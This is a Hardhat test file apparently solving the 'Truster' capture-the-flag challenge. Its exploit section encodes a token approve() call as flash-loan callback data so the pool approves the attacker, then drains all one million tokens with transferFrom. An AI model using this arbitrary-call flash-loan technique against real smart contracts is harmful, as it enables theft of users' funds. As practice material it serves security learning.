const { ethers } = require('hardhat');
const { expect } = require('chai');
const {address} = require("hardhat/internal/core/config/config-validation");

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        const ABI = [
            // "function transfer(address to, uint amount)"
            // "function transferFrom(address sender,address recipient,uint amount)"
            "function approve(address spender,uint amount)"


        ];
        const iface = new ethers.utils.Interface(ABI);
        const byteArr = iface.encodeFunctionData("approve", [ attacker.address, ethers.utils.parseEther("1000000.0") ])

        await this.pool.connect(attacker).flashLoan(0,attacker.address, this.token.address,byteArr);
        this.token.connect(attacker).transferFrom(this.pool.address,attacker.address,ethers.utils.parseEther("1000000.0"));
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});